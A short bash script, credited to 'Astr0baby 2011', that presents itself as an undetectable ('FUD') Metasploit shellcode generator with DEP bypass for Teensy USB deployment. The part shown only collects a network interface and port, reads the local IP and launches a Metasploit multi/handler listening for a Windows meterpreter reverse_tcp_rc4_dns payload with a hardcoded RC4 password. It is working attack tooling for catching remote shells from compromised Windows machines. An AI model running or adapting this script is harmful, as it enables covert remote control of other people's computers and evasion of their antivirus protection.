#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "       DEP-Bypass  By Astr0baby 2011  Merry X-Mas  FUD         " 
echo "       For Automatic Teensy programming and deployment         "
echo "***************************************************************"
echo "Here is a network device list available on yor machine" 
cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
echo -e "What network interface are we gonna use ?  \c"
read interface
echo -e "What Port Number are we gonna listen to? : \c"
read port
# Get OS name
OS=`uname` 
IO="" # store IP
case $OS in
   Linux) IP=`/sbin/ifconfig $interface  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`;;
   *) IP="Unknown";;
esac
echo "      starting the meterpreter listener.."
./msfcli exploit/multi/handler  PAYLOAD=windows/meterpreter/reverse_tcp_rc4_dns RC4PASSWORD=passpass LHOST=$IP LPORT=$port  E 
